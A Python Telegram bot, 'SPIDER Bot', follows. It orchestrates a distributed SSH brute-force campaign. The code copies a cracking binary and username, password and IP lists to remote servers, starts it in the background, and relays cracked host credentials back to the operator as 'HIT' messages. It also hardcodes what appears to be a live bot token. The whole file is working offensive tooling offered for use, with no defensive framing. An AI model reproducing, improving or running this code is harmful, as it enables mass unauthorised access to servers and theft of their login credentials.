import asyncio
import sqlite3
import os
import re
import time
from pathlib import Path
from typing import Optional

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes, ConversationHandler
)
from telegram.constants import ParseMode
import paramiko
from scp import SCPClient

# ─── CONFIG ───
BOT_TOKEN     = "9165016422:AAF2V5jSFk6VVA63F70Lp7B9CZzd96IRGFA"
ADMIN_CHAT    = 7623976106
CRACKER_BIN   = "/root/ssh-cracker/sshgs"
BASE_DIR      = Path("/root/spider-bot")
WORK_DIR      = BASE_DIR / "work"
DB_PATH       = str(BASE_DIR / "spider.db")
WORK_DIR.mkdir(parents=True, exist_ok=True)

# ─── STATES ───
(
    MAIN, SERVER_MENU, SERVER_ADD_IP, SERVER_ADD_USER, SERVER_ADD_PASS,
    SERVER_DEL,
    CRACK_USER, CRACK_PASS, CRACK_IP, CRACK_TIMEOUT, CRACK_WORKERS, CRACK_CONFIRM,
) = range(12)


# ─── DB ───
def db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn


def init_db():
    conn = db()
    conn.executescript("""
    CREATE TABLE IF NOT EXISTS servers (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        ip TEXT NOT NULL, port INTEGER DEFAULT 22,
        username TEXT NOT NULL, password TEXT NOT NULL,
        added_at TEXT DEFAULT CURRENT_TIMESTAMP,
        status TEXT DEFAULT 'unknown'
    );
    CREATE TABLE IF NOT EXISTS jobs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        status TEXT DEFAULT 'pending',
        total_ips INTEGER, server_count INTEGER,
        timeout INTEGER, workers INTEGER,
        created_at TEXT DEFAULT CURRENT_TIMESTAMP,
        finished_at TEXT DEFAULT NULL
    );
    CREATE TABLE IF NOT EXISTS chunks (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        job_id INTEGER, server_id INTEGER,
        ip_file TEXT, status TEXT DEFAULT 'pending',
        goods INTEGER DEFAULT 0,
        started_at TEXT DEFAULT NULL,
        finished_at TEXT DEFAULT NULL
    );
    CREATE TABLE IF NOT EXISTS hits (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        job_id INTEGER, server_id INTEGER,
        ip TEXT, port INTEGER, username TEXT, password TEXT,
        raw TEXT, created_at TEXT DEFAULT CURRENT_TIMESTAMP
    );
    """)
    conn.commit()
    conn.close()


# ─── KEYBOARDS ───
def kb_main():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⚡ SSH Cracker", callback_data="cracker")],
        [InlineKeyboardButton("🖥 Servers", callback_data="servers")],
        [InlineKeyboardButton("📊 Status", callback_data="status")],
    ])


def kb_servers():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("➕ Add Server", callback_data="srv_add")],
        [InlineKeyboardButton("📋 List", callback_data="srv_list")],
        [InlineKeyboardButton("🗑 Delete", callback_data="srv_del")],
        [InlineKeyboardButton("🔙 Back", callback_data="back_main")],
    ])


def kb_back():
    return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Menu", callback_data="back_main")]])


# ─── SSH HELPERS ───
def ssh_connect(ip, port, user, password, timeout=10):
    c = paramiko.SSHClient()
    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    c.connect(ip, port=port, username=user, password=password,
              timeout=timeout, banner_timeout=timeout, auth_timeout=timeout)
    return c


def ssh_exec(c, cmd, timeout=30):
    stdin, stdout, stderr = c.exec_command(cmd, timeout=timeout)
    return stdout.read().decode(errors='replace')


# ─── HANDLERS ───
async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != ADMIN_CHAT:
        await update.message.reply_text("Unauthorized.")
        return ConversationHandler.END
    await update.message.reply_text(
        "<b>🕷 SPIDER Bot</b>\n\n"
        "Multi-server SSH cracker orchestrator.\n"
        "Pick an option:",
        reply_markup=kb_main(), parse_mode=ParseMode.HTML,
    )
    return MAIN


async def button_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    data = q.data

    if data == "back_main":
        await q.edit_message_text("<b>🕷 SPIDER Bot</b>", reply_markup=kb_main(), parse_mode=ParseMode.HTML)
        return MAIN

    if data == "servers":
        await q.edit_message_text("🖥 <b>Servers</b>", reply_markup=kb_servers(), parse_mode=ParseMode.HTML)
        return SERVER_MENU

    if data == "srv_add":
        await q.edit_message_text("Send server as <code>IP:PORT</code> (e.g. <code>1.2.3.4:22</code>):",
                                  parse_mode=ParseMode.HTML)
        return SERVER_ADD_IP

    if data == "srv_list":
        conn = db()
        rows = conn.execute("SELECT * FROM servers ORDER BY id").fetchall()
        conn.close()
        if not rows:
            await q.edit_message_text("No servers yet.", reply_markup=kb_servers())
            return SERVER_MENU
        lines = ["<b>Servers:</b>\n"]
        for s in rows:
            lines.append(f"<code>#{s['id']}</code> {s['ip']}:{s['port']} — <code>{s['username']}</code> — <b>{s['status']}</b>")
        await q.edit_message_text("\n".join(lines), reply_markup=kb_servers(), parse_mode=ParseMode.HTML)
        return SERVER_MENU

    if data == "srv_del":
        conn = db()
        rows = conn.execute("SELECT * FROM servers").fetchall()
        conn.close()
        if not rows:
            await q.edit_message_text("No servers to delete.", reply_markup=kb_servers())
            return SERVER_MENU
        btns = [[InlineKeyboardButton(f"#{s['id']} {s['ip']}", callback_data=f"srvdel_{s['id']}")] for s in rows]
        btns.append([InlineKeyboardButton("🔙 Back", callback_data="servers")])
        await q.edit_message_text("Pick server to delete:", reply_markup=InlineKeyboardMarkup(btns))
        return SERVER_MENU

    if data.startswith("srvdel_"):
        sid = int(data.split("_")[1])
        conn = db()
        conn.execute("DELETE FROM servers WHERE id=?", (sid,))
        conn.commit()
        conn.close()
        await q.edit_message_text(f"✅ Deleted server #{sid}.", reply_markup=kb_servers())
        return SERVER_MENU

    if data == "status":
        conn = db()
        jobs = conn.execute("SELECT * FROM jobs ORDER BY id DESC LIMIT 5").fetchall()
        sc = conn.execute("SELECT COUNT(*) c FROM servers").fetchone()['c']
        hits = conn.execute("SELECT COUNT(*) c FROM hits").fetchone()['c']
        conn.close()
        lines = [f"<b>📊 Status</b>", f"Servers: {sc}", f"Total hits: {hits}", ""]
        if jobs:
            lines.append("Recent jobs:")
            for j in jobs:
                lines.append(f"#{j['id']} — {j['status']} — {j['server_count']} servers — {j['total_ips']} IPs")
        await q.edit_message_text("\n".join(lines), reply_markup=kb_main(), parse_mode=ParseMode.HTML)
        return MAIN

    if data == "cracker":
        conn = db()
        servers = conn.execute("SELECT * FROM servers WHERE status IN ('online','unknown')").fetchall()
        conn.close()
        if not servers:
            await q.edit_message_text("❌ No servers registered.\nAdd at least one first.",
                                      reply_markup=kb_servers())
            return SERVER_MENU
        await q.edit_message_text(
            f"⚡ <b>SSH Cracker</b>\nServers ready: <b>{len(servers)}</b>\n\n"
            f"<b>Step 1/5:</b> Send <code>user.txt</code> file.",
            parse_mode=ParseMode.HTML,
        )
        return CRACK_USER

    if data == "launch":
        return await launch_job(q, ctx)

    return MAIN


# ─── SERVER ADD ───
async def server_add_ip(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    m = re.match(r'^(\d{1,3}(?:\.\d{1,3}){3}):(\d+)$', update.message.text.strip())
    if not m:
        await update.message.reply_text("Invalid. Send <code>IP:PORT</code>", parse_mode=ParseMode.HTML)
        return SERVER_ADD_IP
    ctx.user_data['srv_ip'] = m.group(1)
    ctx.user_data['srv_port'] = int(m.group(2))
    await update.message.reply_text(f"✅ <code>{m.group(1)}:{m.group(2)}</code>\n\nSend username:",
                                    parse_mode=ParseMode.HTML)
    return SERVER_ADD_USER


async def server_add_user(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    ctx.user_data['srv_user'] = update.message.text.strip()
    await update.message.reply_text("Send password:")
    return SERVER_ADD_PASS


async def server_add_pass(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    pwd = update.message.text.strip()
    ip, port, user = ctx.user_data['srv_ip'], ctx.user_data['srv_port'], ctx.user_data['srv_user']

    msg = await update.message.reply_text("🔍 Testing connection...")
    try:
        c = await asyncio.to_thread(ssh_connect, ip, port, user, pwd, 15)
        info = await asyncio.to_thread(ssh_exec, c, "hostname && uname -sr")
        c.close()
    except Exception as e:
        await msg.edit_text(f"❌ Failed: <code>{str(e)[:200]}</code>", parse_mode=ParseMode.HTML)
        await update.message.reply_text("Try again or cancel.", reply_markup=kb_servers())
        return SERVER_MENU

    conn = db()
    sid = conn.execute(
        "INSERT INTO servers (ip, port, username, password, status) VALUES (?,?,?,?, 'online')",
        (ip, port, user, pwd),
    ).lastrowid
    conn.commit(); conn.close()

    await msg.edit_text(
        f"✅ Server #{sid} added\n<code>{ip}:{port}</code>\n{info.strip()[:200]}",
        reply_markup=kb_servers(), parse_mode=ParseMode.HTML,
    )
    return SERVER_MENU


# ─── CRACKER FLOW ───
async def crack_user(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not update.message.document:
        await update.message.reply_text("Send as document.")
        return CRACK_USER
    f = await update.message.document.get_file()
    path = WORK_DIR / f"u_{int(time.time())}.txt"
    await f.download_to_drive(str(path))
    ctx.user_data['u_file'] = str(path)
    await update.message.reply_text(f"✅ user.txt saved\n\n<b>Step 2/5:</b> Send <code>pass.txt</code>",
                                    parse_mode=ParseMode.HTML)
    return CRACK_PASS


async def crack_pass(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not update.message.document:
        await update.message.reply_text("Send as document.")
        return CRACK_PASS
    f = await update.message.document.get_file()
    path = WORK_DIR / f"p_{int(time.time())}.txt"
    await f.download_to_drive(str(path))
    ctx.user_data['p_file'] = str(path)
    await update.message.reply_text(f"✅ pass.txt saved\n\n<b>Step 3/5:</b> Send <code>ip.txt</code>",
                                    parse_mode=ParseMode.HTML)
    return CRACK_IP


async def crack_ip(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not update.message.document:
        await update.message.reply_text("Send as document.")
        return CRACK_IP
    f = await update.message.document.get_file()
    path = WORK_DIR / f"ip_{int(time.time())}.txt"
    await f.download_to_drive(str(path))
    count = sum(1 for l in open(path) if l.strip() and not l.startswith('#'))
    ctx.user_data['ip_file'] = str(path)
    ctx.user_data['ip_count'] = count
    await update.message.reply_text(f"✅ ip.txt saved ({count:,} lines)\n\n<b>Step 4/5:</b> Timeout (sec, e.g. 3):",
                                    parse_mode=ParseMode.HTML)
    return CRACK_TIMEOUT


async def crack_timeout(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        t = int(update.message.text.strip()); assert 1 <= t <= 60
    except Exception:
        await update.message.reply_text("Invalid (1-60).")
        return CRACK_TIMEOUT
    ctx.user_data['timeout'] = t
    await update.message.reply_text(f"✅ Timeout: {t}s\n\n<b>Step 5/5:</b> Workers (e.g. 200):",
                                    parse_mode=ParseMode.HTML)
    return CRACK_WORKERS


async def crack_workers(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        w = int(update.message.text.strip()); assert 1 <= w <= 2000
    except Exception:
        await update.message.reply_text("Invalid (1-2000).")
        return CRACK_WORKERS
    ctx.user_data['workers'] = w

    conn = db()
    servers = conn.execute("SELECT * FROM servers WHERE status IN ('online','unknown')").fetchall()
    conn.close()
    n = len(servers)
    per = ctx.user_data['ip_count'] // n if n else 0

    summary = (
        f"<b>🚀 Ready</b>\n"
        f"Servers: <code>{n}</code>\n"
        f"IPs per server: <code>~{per:,}</code>\n"
        f"Timeout: <code>{ctx.user_data['timeout']}s</code>\n"
        f"Workers: <code>{ctx.user_data['workers']}</code>\n\n"
        f"Launch?"
    )
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("✅ Launch", callback_data="launch")],
        [InlineKeyboardButton("❌ Cancel", callback_data="back_main")],
    ])
    await update.message.reply_text(summary, reply_markup=kb, parse_mode=ParseMode.HTML)
    return CRACK_CONFIRM


async def launch_job(q, ctx):
    conn = db()
    servers = conn.execute("SELECT * FROM servers WHERE status IN ('online','unknown')").fetchall()
    if not servers:
        conn.close()
        await q.edit_message_text("No servers.")
        return MAIN

    job_id = conn.execute(
        "INSERT INTO jobs (status, total_ips, server_count, timeout, workers) VALUES ('running', ?, ?, ?, ?)",
        (ctx.user_data['ip_count'], len(servers), ctx.user_data['timeout'], ctx.user_data['workers'])
    ).lastrowid
    conn.commit()

    with open(ctx.user_data['ip_file']) as f:
        ips = [l.strip() for l in f if l.strip() and not l.startswith('#')]

    n = len(servers)
    base = len(ips) // n
    rem = len(ips) % n
    idx = 0
    chunks = []
    for i, s in enumerate(servers):
        take = base + (1 if i < rem else 0)
        chunk = ips[idx:idx+take]; idx += take
        p = WORK_DIR / f"job{job_id}_srv{s['id']}.txt"
        p.write_text("\n".join(chunk) + "\n")
        cid = conn.execute(
            "INSERT INTO chunks (job_id, server_id, ip_file, status) VALUES (?,?,?, 'pending')",
            (job_id, s['id'], str(p))
        ).lastrowid
        chunks.append((cid, s, p, take))
    conn.close()

    await q.edit_message_text(
        f"🚀 <b>Job #{job_id}</b> — {n} servers\nDistributing...",
        parse_mode=ParseMode.HTML,
    )

    chat_id = q.message.chat_id
    asyncio.create_task(_run_job(chat_id, ctx.bot, job_id, chunks, ctx.user_data))
    return MAIN


async def _run_job(chat_id, bot, job_id, chunks, data):
    try:
        results = await asyncio.gather(
            *[_launch_chunk(bot, chat_id, job_id, cid, s, p, n, data) for cid, s, p, n in chunks],
            return_exceptions=True,
        )
        await bot.send_message(chat_id, "👀 All dispatched. Monitoring hits...")
        await _monitor(bot, chat_id, job_id)
    except Exception as e:
        await bot.send_message(chat_id, f"❌ job error: {e}")


async def _launch_chunk(bot, chat_id, job_id, chunk_id, server, chunk_path, count, data):
    ip, port = server['ip'], server['port']
    u, p = server['username'], server['password']

    try:
        c = await asyncio.to_thread(ssh_connect, ip, port, u, p, 15)
    except Exception as e:
        await bot.send_message(chat_id, f"❌ #{server['id']} {ip}: {str(e)[:100]}")
        conn = db()
        conn.execute("UPDATE chunks SET status='error' WHERE id=?", (chunk_id,))
        conn.execute("UPDATE servers SET status='offline' WHERE id=?", (server['id'],))
        conn.commit(); conn.close()
        return

    try:
        rdir = f"/root/spider_{job_id}"
        await asyncio.to_thread(ssh_exec, c, f"mkdir -p {rdir}")

        scp = SCPClient(c.get_transport())
        await asyncio.to_thread(scp.put, CRACKER_BIN, f"{rdir}/sshgs")
        await asyncio.to_thread(scp.put, data['u_file'], f"{rdir}/user.txt")
        await asyncio.to_thread(scp.put, data['p_file'], f"{rdir}/pass.txt")
        await asyncio.to_thread(scp.put, str(chunk_path), f"{rdir}/ip.txt")
        scp.close()

        await asyncio.to_thread(ssh_exec, c, f"chmod +x {rdir}/sshgs && rm -f {rdir}/su-goods.txt {rdir}/detailed-results.txt {rdir}/honeypots.txt {rdir}/results.jsonl")

        inp = f"user.txt\\npass.txt\\nip.txt\\n{data['timeout']}\\n{data['workers']}\\n"
        cmd = (
            f"cd {rdir} && setsid bash -c "
            f"'printf \"{inp}\" | ./sshgs' "
            f"> crack.log 2>&1 < /dev/null &"
        )
        await asyncio.to_thread(ssh_exec, c, cmd)

        conn = db()
        conn.execute("UPDATE chunks SET status='running', started_at=CURRENT_TIMESTAMP WHERE id=?", (chunk_id,))
        conn.execute("UPDATE servers SET status='online' WHERE id=?", (server['id'],))
        conn.commit(); conn.close()

        await bot.send_message(chat_id,
            f"✅ #{server['id']} <code>{ip}</code> — {count:,} IPs started",
            parse_mode=ParseMode.HTML)
    except Exception as e:
        await bot.send_message(chat_id, f"⚠️ #{server['id']} {ip}: {str(e)[:150]}")
        conn = db()
        conn.execute("UPDATE chunks SET status='error' WHERE id=?", (chunk_id,))
        conn.commit(); conn.close()
    finally:
        c.close()


async def _monitor(bot, chat_id, job_id):
    conn = db()
    chunks = conn.execute("SELECT * FROM chunks WHERE job_id=?", (job_id,)).fetchall()
    servers = {s['id']: s for s in conn.execute("SELECT * FROM servers").fetchall()}
    conn.close()

    last_goods = {c['id']: 0 for c in chunks}
    idle_rounds = 0

    while True:
        await asyncio.sleep(30)
        any_running = False
        total = 0

        for ch in chunks:
            s = servers.get(ch['server_id'])
            if not s:
                continue
            try:
                c = await asyncio.to_thread(ssh_connect, s['ip'], s['port'], s['username'], s['password'], 10)
                rdir = f"/root/spider_{job_id}"
                out = await asyncio.to_thread(ssh_exec, c, f"wc -l < {rdir}/su-goods.txt 2>/dev/null || echo 0")
                gc = int((out.strip() or "0").split()[0])
                total += gc

                proc = await asyncio.to_thread(ssh_exec, c, "pgrep -f sshgs | head -1")
                if proc.strip():
                    any_running = True

                if gc > last_goods[ch['id']]:
                    detail = await asyncio.to_thread(ssh_exec, c, f"cat {rdir}/su-goods.txt")
                    lines = detail.strip().split("\n")
                    for line in lines[last_goods[ch['id']]:]:
                        line = line.strip()
                        if not line: continue
                        m = re.match(r'^(\d+\.\d+\.\d+\.\d+):(\d+)@([^:]+):(.+)$', line)
                        if not m: continue
                        hip, hport, hu, hp = m.groups()
                        db_conn = db()
                        db_conn.execute(
                            "INSERT INTO hits (job_id, server_id, ip, port, username, password, raw) VALUES (?,?,?,?,?,?,?)",
                            (job_id, s['id'], hip, int(hport), hu, hp, line)
                        )
                        db_conn.commit(); db_conn.close()
                        await bot.send_message(
                            chat_id,
                            f"🎯 <b>HIT</b> (srv #{s['id']})\n"
                            f"<code>{hip}:{hport}</code>\n"
                            f"🔑 <code>{hu}:{hp}</code>",
                            parse_mode=ParseMode.HTML,
                        )
                    last_goods[ch['id']] = gc

                c.close()
            except Exception:
                pass

        if any_running:
            idle_rounds = 0
        else:
            idle_rounds += 1
            if idle_rounds >= 2:
                conn = db()
                conn.execute("UPDATE jobs SET status='finished', finished_at=CURRENT_TIMESTAMP WHERE id=?", (job_id,))
                conn.commit(); conn.close()
                await bot.send_message(chat_id,
                    f"✅ <b>Job #{job_id} finished</b>\nTotal hits: <code>{total}</code>",
                    parse_mode=ParseMode.HTML)
                return


# ─── CANCEL / FALLBACK ───
async def cancel(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Cancelled.", reply_markup=kb_main())
    return MAIN


async def post_init(app: Application):
    await app.bot.set_my_commands([BotCommand("start", "Open menu")])


# ─── MAIN ───
def main():
    if not os.path.exists(CRACKER_BIN):
        print(f"[!] Cracker not found: {CRACKER_BIN}")
        print("    Build: cd ~/ssh-cracker && go build -o sshgs ./ssh.go")
        return
    init_db()

    app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()

    conv = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            MAIN: [CallbackQueryHandler(button_handler)],
            SERVER_MENU: [CallbackQueryHandler(button_handler)],
            SERVER_ADD_IP: [MessageHandler(filters.TEXT & ~filters.COMMAND, server_add_ip)],
            SERVER_ADD_USER: [MessageHandler(filters.TEXT & ~filters.COMMAND, server_add_user)],
            SERVER_ADD_PASS: [MessageHandler(filters.TEXT & ~filters.COMMAND, server_add_pass)],
            CRACK_USER: [MessageHandler(filters.Document.ALL, crack_user)],
            CRACK_PASS: [MessageHandler(filters.Document.ALL, crack_pass)],
            CRACK_IP: [MessageHandler(filters.Document.ALL, crack_ip)],
            CRACK_TIMEOUT: [MessageHandler(filters.TEXT & ~filters.COMMAND, crack_timeout)],
            CRACK_WORKERS: [MessageHandler(filters.TEXT & ~filters.COMMAND, crack_workers)],
            CRACK_CONFIRM: [
                CallbackQueryHandler(button_handler, pattern="^(launch|back_main)$"),
            ],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
        allow_reentry=True,
    )
    app.add_handler(conv)
    print("[+] SPIDER Bot running...")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()